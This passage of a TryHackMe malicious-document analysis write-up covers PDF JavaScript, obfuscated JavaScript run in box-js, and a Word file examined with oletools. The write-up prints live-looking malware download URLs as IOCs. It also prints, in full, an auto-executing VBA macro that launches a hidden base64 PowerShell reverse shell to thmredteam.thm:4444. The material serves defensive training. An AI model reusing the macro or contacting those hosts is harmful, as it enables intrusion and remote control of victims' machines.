</code></pre> <p>The output shows that <em>OpenAction</em> will trigger the object number <strong>6</strong>, which is the <em>JavaScript</em> object.</p> <pre><code class="language-pdf">remnux@thm-remnux:~/Desktop$ pdf-parser.py --object 6  simple.pdf 
obj 6 0
 Type: /Action
 Referencing: 

  &lt;&lt;
    /Type /Action
    /S /JavaScript
    /JS &lt;6170702E616C657274282254484D7B4C75636B696C795F546869735F49736E27745F4861726D66756C7D22293B0A&gt;
  &gt;&gt;
</code></pre> <p>Using the above outputs, we can deduce that the <code class="language-plaintext highlighter-rouge">&lt;617070...</code> hexadecimal-text cipher will be executed as JS code as the pdf is opened.</p> <h4 id="peepdf">peepdf</h4> <p><code class="language-plaintext highlighter-rouge">peepdf</code> is another PDF analysis tool to determine if there is any suspicious elements. We can also use the interactive option <code class="language-plaintext highlighter-rouge">peepdf -i pdf_file</code> to navigate through the objects.</p> <p>With <code class="language-plaintext highlighter-rouge">peepdf simple.pdf</code>, we already get useful information such as:</p> <ul> <li>Hashes.</li> <li>Number of objects/streams/URLS found in the document.</li> <li>References to the objects.</li> <li>List of suspicious elements like <em>JavaScript/OpenAction</em>, etc.</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Desktop<span class="nv">$ </span>peepdf simple.pdf 
Warning: PyV8 is not installed!!

File: simple.pdf
MD5: 2992490eb3c13d8006e8e17315a9190e
SHA1: 75884015d6d984a4fcde046159f4c8f9857500ee
SHA256: 83fefd2512591b8d06cda47d56650f9cbb75f2e8dbe0ab4186bf4c0483ef468a
Size: 28891 bytes
Version: 1.7
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 18
Streams: 3
URIs: 0
Comments: 0
Errors: 0

Version 0:
 Catalog: 1
 Info: 7
 Objects <span class="o">(</span>18<span class="o">)</span>: <span class="o">[</span>1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18]
 Streams <span class="o">(</span>3<span class="o">)</span>: <span class="o">[</span>4, 15, 18]
  Encoded <span class="o">(</span>2<span class="o">)</span>: <span class="o">[</span>15, 18]
 Objects with JS code <span class="o">(</span>1<span class="o">)</span>: <span class="o">[</span>6]
 Suspicious elements:
  /OpenAction <span class="o">(</span>1<span class="o">)</span>: <span class="o">[</span>1]
  /JS <span class="o">(</span>1<span class="o">)</span>: <span class="o">[</span>6]
  /JavaScript <span class="o">(</span>1<span class="o">)</span>: <span class="o">[</span>6]
</code></pre></div></div> <p>After that, we might use the interactive function for deeper analysis:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PPDF&gt; <span class="nb">help

</span>Documented commands <span class="o">(</span><span class="nb">type help</span> &lt;topic&gt;<span class="o">)</span>:
<span class="o">========================================</span>
bytes           <span class="nb">exit         </span>js_jjdecode       open          search    
changelog       extract      js_join           quit          <span class="nb">set       
</span>create          filters      js_unescape       rawobject     show      
decode          <span class="nb">hash         </span>js_vars           rawstream     stream    
decrypt         <span class="nb">help         </span>log               references    tree      
embed           info         malformed_output  replace       vtcheck   
encode          js_analyse   metadata          reset         xor       
encode_strings  js_beautify  modify            save          xor_search
encrypt         js_code      object            save_version
errors          js_eval      offsets           sctest 
</code></pre></div></div> <p>Furthermore, using <em>object</em>, we are able to retrieve our previously found JS object. The JS code is even decoded.</p> <pre><code class="language-pdf">PPDF&gt; object 6

&lt;&lt; /Type /Action
/S /JavaScript
/JS app.alert("THM{Luckily_This_Isn't_Harmful}");
 &gt;&gt;
</code></pre> <p>Similarly, we can extract the actual JS code with the <em>extract</em> keyword:</p> <pre><code class="language-pdf">PPDF&gt; extract

Usage: extract uri|js [$version]

Extracts all the given type elements of the specified version after being decoded and decrypted (if necessary)

PPDF&gt; extract js

// peepdf comment: Javascript code located in object 6 (version 0)

app.alert("THM{Luckily_This_Isn't_Harmful}");
</code></pre> <p>Now, we are able to extract <em>IOC</em> (Indicators of Compromise) from a PDF file. A more complex JS code with IOC will be unraveled.</p> <h3 id="questions-1">Questions</h3> <p><strong>What is the flag found inside the JavaScript code?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">THM{Luckily_This_Isn't_Harmful}</code></em></p> <p><strong>How many OpenAction objects were found within the document?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>How many Encoded objects were found in the document?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>What are the numbers of encoded objects? (Separate with a comma)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">15,18</code></em></p> <h2 id="task-7---analyzing-malicious-javascript">Task 7 - Analyzing Malicious JavaScript</h2> <p>To start with, we are provided an obfuscated javascript code by a junior analyst and our role is to skim through the code to examine its characteristics and possibly deobfuscate. This is made in order to extract IOCs that could help in creating detection rules.</p> <p>In the provided lab, we open the file <code class="language-plaintext highlighter-rouge">notepad /home/remnux/Javascript-code/embedded-code.js</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/S12xAECkyg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="notepad embedded-code.js" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>The code has the following characteristics:</p> <ul> <li>It is very complex and time-consuming to analyze</li> <li>It is heavily obfuscated with nonsense variable names</li> </ul> <p>It is posible to do a static analysis by trying to deobfuscate the code. However, we will choose the option of dynamic analysis using <code class="language-plaintext highlighter-rouge">box-js</code> to save some time while being able to extract IOCs.</p> <p><em>Box-js</em> is a tool made to run a javascript code in a controlled environment . It is primarily made for analyzing malicious code with automatic dynamic analysis in a sandbox.</p> <p>When we open our obfuscated code in the sandbox tool, we get the detected IOCs in the console, which here are some weird-looking URLs:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Javascript-code<span class="nv">$ </span>box-js embedded-code.js 
Using a 10 seconds <span class="nb">timeout</span>, pass <span class="nt">--timeout</span> to specify another <span class="nb">timeout </span><span class="k">in </span>seconds
<span class="o">[</span>warn] jschardet <span class="o">(</span>v1.6.0<span class="o">)</span> couldn<span class="s1">'t detect encoding, using UTF-8
[info] GET https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/
[info] IOC: The script fetched an URL.
[info] GET http://aristonbentre.com/slideshow/O1uPzXd2YscA/
[info] IOC: The script fetched an URL.
[info] GET https://applink.gr/wp-admin/pWxO42PQrVL0ja5LTfhy/
[info] IOC: The script fetched an URL.
[info] GET http://attatory.com/i-bmail/6AfEa8G0W8NOtUh7hqFj/
[info] IOC: The script fetched an URL.
[info] GET http://asakitreks.com/uploads/ce8u7/
[info] IOC: The script fetched an URL.
[info] GET https://www.ata-sistemi.si/wp-admin/cVDQapxmtAQQq1gr3/
[info] IOC: The script fetched an URL.
[info] GET http://bvdkhuyentanyen.vn/files/TKK8yKdEvyYAbBE5avb/
[info] IOC: The script fetched an URL.
[info] GET http://bluegdps100.7m.pl/app/Ac8wwulKxqZjc/
[info] IOC: The script fetched an URL.
[info] GET https://casapollux.com/Bilder/GDo3zoURY/ 
[info] IOC: The script fetched an URL.
</span></code></pre></div></div> <p>As a result, we get the dropped files and useful information retrieved by <em>box-js</em>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Javascript-code<span class="nv">$ </span><span class="nb">ls
</span>embedded-code.js  embedded-code.js.results
remnux@thm-remnux:~/Javascript-code<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span> embedded-code.js.results/
total 152K
drwxrwxr-x 2 remnux remnux 4.0K Oct 17 07:44 <span class="nb">.</span>
drwxrwxr-x 3 remnux remnux 4.0K Oct 17 07:44 ..
<span class="nt">-rw-rw-r--</span> 1 remnux remnux  941 Oct 17 07:44 analysis.log
<span class="nt">-rw-rw-r--</span> 1 remnux remnux 126K Oct 17 07:44 c5c3e5e4-5276-40ca-a61f-d7779b7d3220.js
<span class="nt">-rw-rw-r--</span> 1 remnux remnux 1.7K Oct 17 07:44 IOC.json
<span class="nt">-rw-rw-r--</span> 1 remnux remnux   72 Oct 17 07:44 snippets.json
<span class="nt">-rw-rw-r--</span> 1 remnux remnux  465 Oct 17 07:44 urls.json
</code></pre></div></div> <p><em>IOC.json</em></p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
 </span><span class="p">{</span><span class="w">
  </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"UrlFetch"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
   </span><span class="nl">"method"</span><span class="p">:</span><span class="w"> </span><span class="s2">"GET"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"headers"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"The script fetched an URL."</span><span class="w">
 </span><span class="p">},</span><span class="w">
</span><span class="err">...</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div> <p><em>urls.json</em></p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
 </span><span class="s2">"https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://aristonbentre.com/slideshow/O1uPzXd2YscA/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"https://applink.gr/wp-admin/pWxO42PQrVL0ja5LTfhy/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://attatory.com/i-bmail/6AfEa8G0W8NOtUh7hqFj/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://asakitreks.com/uploads/ce8u7/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"https://www.ata-sistemi.si/wp-admin/cVDQapxmtAQQq1gr3/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://bvdkhuyentanyen.vn/files/TKK8yKdEvyYAbBE5avb/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://bluegdps100.7m.pl/app/Ac8wwulKxqZjc/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"https://casapollux.com/Bilder/GDo3zoURY/ "</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div> <p><em>analysis.log</em></p> <pre><code class="language-log">[warn] jschardet (v1.6.0) couldn't detect encoding, using UTF-8
[info] GET https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/
[info] IOC: The script fetched an URL.
[info] GET http://aristonbentre.com/slideshow/O1uPzXd2YscA/
[info] IOC: The script fetched an URL.
...
</code></pre> <p><em>snippets.json</em></p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
 </span><span class="nl">"241448cc-e5cf-419e-9056-a8af926e924e.js"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="nl">"as"</span><span class="p">:</span><span class="w"> </span><span class="s2">"eval'd JS"</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span><span class="err">a</span><span class="w">
</span></code></pre></div></div> <h3 id="question-1">Question</h3> <p><strong>What is the name of the dumped file that contains information about the URLs?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">urls.json</code></em></p> <p><strong>How many URLs were extracted from JavaScript?</strong></p> <p>We can count manually or use <code class="language-plaintext highlighter-rouge">grep</code> and <code class="language-plaintext highlighter-rouge">wc</code> to count lines for us:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Javascript-code/embedded-code.js.results<span class="nv">$ </span><span class="nb">cat </span>urls.json | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'"https?://[^"]+"'</span> | <span class="nb">wc</span> <span class="nt">-l</span>
9
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">9</code></em></p> <p><strong>What is the full URL which contains the keyword slideshow? (defang the URL)</strong></p> <p>We can manually check or also use <code class="language-plaintext highlighter-rouge">grep</code> to take the URL:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Javascript-code/embedded-code.js.results<span class="nv">$ </span><span class="nb">cat </span>urls.json | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'https?://[^"]*slideshow[^"]*'</span> 
http://aristonbentre.com/slideshow/O1uPzXd2YscA/
</code></pre></div></div> <p>Then, we <strong>defang</strong> (making the url safe to share) the URL using <em>Cyberchef</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/rJBKiBAJkl.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Cyberchef defang" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">hxxp[://]aristonbentre[.]com/slideshow/O1uPzXd2YscA/</code></em></p> <h2 id="task-8---office-docs-analysis">Task 8 - Office Docs Analysis</h2> <p>Word documents are files created using Microsoft Word, a popular word-processing application. These files typically have a <em>.doc</em> or <em>.docx</em> file extension and can contain text, images, tables, charts… There are two Word document formats:</p> <ul> <li> <strong>Structured Storage Format (OLE - Object Linking and Embedding):</strong> This type of document is a binary format used by Word 97-2003? These files have extensions like <em>.doc</em>, <em>.ppt</em>…</li> <li> <strong>Office Open XML Format (OOXML):</strong> This document type is an XML-formated document used by Word 2007 and later. It is actually a zipped file containing all related data within the document. These files have extensions such as <em>.docx</em>, <em>.docm</em>, <em>.pptx</em>…</li> </ul> <h3 id="what-makes-a-document-malicious">What makes a document malicious</h3> <p>As learned, a document can embed various elements, which some can be used for malicious intent.</p> <ul> <li> <strong>Macros:</strong> Macros are small VBA scripts embedded in Word documents. They are used to automate tasks bu they can also be used to execut malicious code. It can download and install malware on a user’s system, steal sensitive information and more.</li> <li> <strong>Embedded objects:</strong> Word documents can contain embedded objects such as images, audio, video or other types of file. Malicious documents can contain embedded objects that are designed to exploit vulnerabilities of the software.</li> <li> <strong>Links:</strong> Some links can redirect to websites that host malware or phishing pages.</li> <li> <strong>Exploits:</strong> Some code can exploit vulnerabilites in the software. These exploits would typically download and isntall malware on the system.</li> <li> <strong>Hidden Content:</strong> Some hidden contents are not visible to the user but can be used to execute malicious code.</li> </ul> <h3 id="analyzing-a-malicious-document">Analyzing a malicious document</h3> <p>Within the provided lab, we got a sample called <code class="language-plaintext highlighter-rouge">suspicious.doc</code>.</p> <p>The <code class="language-plaintext highlighter-rouge">trid</code> tool is used to identify a file type regardless of its file extension using the file’s characteristics. We will verify our <code class="language-plaintext highlighter-rouge">suspicious.doc</code> to make sure it is really a <em>Microsoft Word 97-2003</em> document.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>trid suspicious.doc 

TrID/32 - File Identifier v2.24 - <span class="o">(</span>C<span class="o">)</span> 2003-16 By M.Pontello
Definitions found:  13206
Analyzing...

Collecting data from file: suspicious.doc
 52.6% <span class="o">(</span>.DOC<span class="o">)</span> Microsoft Word document <span class="o">(</span>30000/1/2<span class="o">)</span>
 33.3% <span class="o">(</span>.DOC<span class="o">)</span> Microsoft Word document <span class="o">(</span>old ver.<span class="o">)</span> <span class="o">(</span>19000/1/2<span class="o">)</span>
 14.0% <span class="o">(</span>.<span class="o">)</span> Generic OLE2 / Multistream Compound <span class="o">(</span>8000/1<span class="o">)</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">oletools</code> is a collection of Python tools designed to analyze Microsoft Office documents, especially those using OLE (Object Linking and Embedding) format (Office 97-2003), for malicious content such as macros or embedded objects. It helps detect and extract potential malware, hidden code, or suspicious indicators within Word documents and other OLE-based files. Only <code class="language-plaintext highlighter-rouge">olevba</code> can be used on <em>.docx</em> and <em>.doc</em> to extract VBA macros.</p> <p><code class="language-plaintext highlighter-rouge">oleid</code> is used to extract information of a <em>.doc</em> to get a better understanding of its structure. We notice this document is a not encrypted document for <em>Microsoft Office Word</em> which contains VBA macros.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>oleid suspicious.doc
oleid 0.54 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: suspicious.doc
 Indicator                      Value                    
 OLE format                     True                     
 Has SummaryInformation stream  True                     
 Application name               b<span class="s1">'Microsoft Office Word'</span> 
 Encrypted                      False                    
 Word Document                  True                     
 VBA Macros                     True                     
 Excel Workbook                 False                    
 PowerPoint Presentation        False                    
 Visio Drawing                  False                    
 ObjectPool                     False                    
 Flash objects                  0   
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">olemeta</code> is used to extract streams and metadata information about a document. Key information we get are :</p> <ul> <li>Author’s name</li> <li>When the document was saved</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>olemeta suspicious.doc 
olemeta 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
<span class="o">===============================================================================</span>
FILE: suspicious.doc

Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1252                          |
|title                |                              |
|subject              |                              |
|author               |CMNatic                       |
|keywords             |                              |
|comments             |                              |
|template             |Normal.dotm                   |
|last_saved_by        |CMNatic                       |
|revision_number      |1                             |
|total_edit_time      |60                            |
|create_time          |2023-09-12 11:45:00           |
|last_saved_time      |2023-09-12 11:46:00           |
|num_pages            |1                             |
|num_words            |0                             |
|num_chars            |0                             |
|creating_application |Microsoft Office Word         |
|security             |0                             |
+---------------------+------------------------------+

Properties from the Document Summary Information stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage_doc         |1252                          |
|lines                |0                             |
|paragraphs           |0                             |
|scale_crop           |False                         |
|company              |                              |
|links_dirty          |False                         |
|chars_with_spaces    |0                             |
|shared_doc           |False                         |
|hlinks_changed       |False                         |
|version              |1048576                       |
+---------------------+------------------------------+
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">oletimes</code> shows all the modification times of the different streams available.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>oletimes suspicious.doc 
oletimes 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
<span class="o">===============================================================================</span>
FILE: suspicious.doc

+----------------------------+---------------------+---------------------+
| Stream/Storage name        | Modification Time   | Creation Time       |
+----------------------------+---------------------+---------------------+
| Root                       | 2023-09-12 11:46:53 | None                |
| <span class="s1">'\x01CompObj'</span>              | None                | None                |
| <span class="s1">'\x05DocumentSummaryInform | None                | None                |
| ation'</span>                     |                     |                     |
| <span class="s1">'\x05SummaryInformation'</span>   | None                | None                |
| <span class="s1">'1Table'</span>                   | None                | None                |
| <span class="s1">'Macros'</span>                   | 2023-09-12 11:46:53 | 2023-09-12 11:46:53 |
| <span class="s1">'Macros/PROJECT'</span>           | None                | None                |
| <span class="s1">'Macros/PROJECTwm'</span>         | None                | None                |
| <span class="s1">'Macros/VBA'</span>               | 2023-09-12 11:46:53 | 2023-09-12 11:46:53 |
| <span class="s1">'Macros/VBA/NewMacros'</span>     | None                | None                |
| <span class="s1">'Macros/VBA/ThisDocument'</span>  | None                | None                |
| <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>  | None                | None                |
| <span class="s1">'Macros/VBA/dir'</span>           | None                | None                |
| <span class="s1">'WordDocument'</span>             | None                | None                |
+----------------------------+---------------------+---------------------+
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">olemap</code> shows information about different sectors of the file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>olemap suspicious.doc 
olemap 0.55 - http://decalage.info/python/oletools
<span class="nt">-------------------------------------------------------------------------------</span>
FILE: suspicious.doc

OLE HEADER:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|OLE Signature <span class="o">(</span>hex<span class="o">)</span>     |D0CF11E0A1B11AE1|Should be D0CF11E0A1B11AE1         |
|Header CLSID            |                |Should be empty <span class="o">(</span>0<span class="o">)</span>                |
|Minor Version           |003E            |Should be 003E                     |
|Major Version           |0003            |Should be 3 or 4                   |
|Byte Order              |FFFE            |Should be FFFE <span class="o">(</span>little endian<span class="o">)</span>     |
|Sector Shift            |0009            |Should be 0009 or 000C             |
|# of Dir Sectors        |0               |Should be 0 <span class="k">if </span>major version is 3  |
|# of FAT Sectors        |1               |                                   |
|First Dir Sector        |00000028        |<span class="o">(</span>hex<span class="o">)</span>                              |
|Transaction Sig Number  |0               |Should be 0                        |
|MiniStream cutoff       |4096            |Should be 4096 bytes               |
|First MiniFAT Sector    |0000002A        |<span class="o">(</span>hex<span class="o">)</span>                              |
|# of MiniFAT Sectors    |2               |                                   |
|First DIFAT Sector      |FFFFFFFE        |<span class="o">(</span>hex<span class="o">)</span>                              |
|# of DIFAT Sectors      |0               |                                   |
+------------------------+----------------+-----------------------------------+

CALCULATED ATTRIBUTES:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|Sector Size <span class="o">(</span>bytes<span class="o">)</span>     |512             |Should be 512 or 4096 bytes        |
|Actual File Size <span class="o">(</span>bytes<span class="o">)</span>|32768           |Real file size on disk             |
|Max File Size <span class="k">in </span>FAT    |66048.0         |Max file size covered by FAT       |
|Extra data beyond FAT   |0               |Only <span class="k">if </span>file is larger than FAT    |
|                        |                |coverage                           |
|Extra data offset <span class="k">in </span>FAT|00008000        |Offset of the 1st free sector at   |
|                        |                |end of FAT                         |
|Extra data size         |0               |Size of data starting at the 1st   |
|                        |                |free sector at end of FAT          |
+------------------------+----------------+-----------------------------------+

To display the FAT or MiniFAT structures, use options <span class="nt">--fat</span> or <span class="nt">--minifat</span>, and <span class="nt">-h</span> <span class="k">for </span>help.

</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">olevba</code> is an important tool widely used for analysis. It extracts all VBA objects found within the file and shares the summary of the suspicious elements.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>olevba suspicious.doc 
olevba 0.56 on Python 3.6.9 - http://decalage.info/python/oletools
<span class="o">===============================================================================</span>
FILE: suspicious.doc
Type: OLE
<span class="nt">-------------------------------------------------------------------------------</span>
VBA MACRO ThisDocument.cls 
<span class="k">in </span>file: suspicious.doc - OLE stream: <span class="s1">'Macros/VBA/ThisDocument'</span>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<span class="o">(</span>empty macro<span class="o">)</span>
<span class="nt">-------------------------------------------------------------------------------</span>
VBA MACRO NewMacros.bas 
<span class="k">in </span>file: suspicious.doc - OLE stream: <span class="s1">'Macros/VBA/NewMacros'</span>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen<span class="o">()</span>
        AutoOpenMacro
End Sub

Sub Document_Open<span class="o">()</span>
        AutoOpenMacro
End Sub

Sub AutoOpenMacro<span class="o">()</span>
        Dim Str As String

        Str <span class="o">=</span> Str + <span class="s2">"powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT"</span>
        Str <span class="o">=</span> Str + <span class="s2">"2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh"</span>
        Str <span class="o">=</span> Str + <span class="s2">"0dHA6Ly90aG1yZWR0ZWFtLnRobS9zdGFnZTIuZXhlIiw0NDQ0K"</span>
        Str <span class="o">=</span> Str + <span class="s2">"Tskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVt"</span>
        Str <span class="o">=</span> Str + <span class="s2">"dXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJ"</span>
        Str <span class="o">=</span> Str + <span class="s2">"HN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk"</span>
        Str <span class="o">=</span> Str + <span class="s2">"pIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hb"</span>
        Str <span class="o">=</span> Str + <span class="s2">"WUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5"</span>
        Str <span class="o">=</span> Str + <span class="s2">"nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0Y"</span>
        Str <span class="o">=</span> Str + <span class="s2">"SAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2V"</span>
        Str <span class="o">=</span> Str + <span class="s2">"uZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZ"</span>
        Str <span class="o">=</span> Str + <span class="s2">"W5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXR"</span>
        Str <span class="o">=</span> Str + <span class="s2">"CeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kY"</span>
        Str <span class="o">=</span> Str + <span class="s2">"nl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2g"</span>
        Str <span class="o">=</span> Str + <span class="s2">"oKX07JGNsaWVudC5DbG9zZSgp"</span>

        CreateObject<span class="o">(</span><span class="s2">"Wscript.Shell"</span><span class="o">)</span>.Run Str
End Sub
</code></pre></div></div> <p>The above output shows the macros found within the document. The summary of key elements is show below.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|IOC       |powershell.exe      |Executable file name                         |
+----------+--------------------+---------------------------------------------+
</code></pre></div></div> <p>The summary show that:</p> <ul> <li>The document will automatically execute when it will be opened.</li> <li>It contains suspicious Bas64 strings and powershell code</li> </ul> <p><code class="language-plaintext highlighter-rouge">oledump</code> is a tool for analyzing and extracting streams to detect and examine potentially malicious content like macros or embedded objects.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>oledump.py suspicious.doc 
  1:       114 <span class="s1">'\x01CompObj'</span>
  2:      4096 <span class="s1">'\x05DocumentSummaryInformation'</span>
  3:      4096 <span class="s1">'\x05SummaryInformation'</span>
  4:      7385 <span class="s1">'1Table'</span>
  5:       412 <span class="s1">'Macros/PROJECT'</span>
  6:        71 <span class="s1">'Macros/PROJECTwm'</span>
  7: M    3303 <span class="s1">'Macros/VBA/NewMacros'</span>
  8: m     938 <span class="s1">'Macros/VBA/ThisDocument'</span>
  9:      2634 <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>
 10:       569 <span class="s1">'Macros/VBA/dir'</span>
 11:      4096 <span class="s1">'WordDocument'</span>

</code></pre></div></div> <p>Objects are represented with numbers, which can be accessed using the <code class="language-plaintext highlighter-rouge">-sX</code> flag, where <em>X</em> is the object number. Moreover, metadata can be shown like with <code class="language-plaintext highlighter-rouge">olemeta</code> with the <code class="language-plaintext highlighter-rouge">-M</code> flag. In order to clearly see the VBA and not a raw binary flow, we must use the <code class="language-plaintext highlighter-rouge">-v</code> flag to decompress VBA.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>oledump.py <span class="nt">-s7</span> <span class="nt">-v</span> suspicious.doc 
Attribute VB_Name <span class="o">=</span> <span class="s2">"NewMacros"</span>
Sub AutoOpen<span class="o">()</span>
        AutoOpenMacro
End Sub

Sub Document_Open<span class="o">()</span>
        AutoOpenMacro
End Sub

Sub AutoOpenMacro<span class="o">()</span>
        Dim Str As String

        Str <span class="o">=</span> Str + <span class="s2">"powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT"</span>
        Str <span class="o">=</span> Str + <span class="s2">"2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh"</span>
        Str <span class="o">=</span> Str + <span class="s2">"0dHA6Ly90aG1yZWR0ZWFtLnRobS9zdGFnZTIuZXhlIiw0NDQ0K"</span>
        Str <span class="o">=</span> Str + <span class="s2">"Tskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVt"</span>
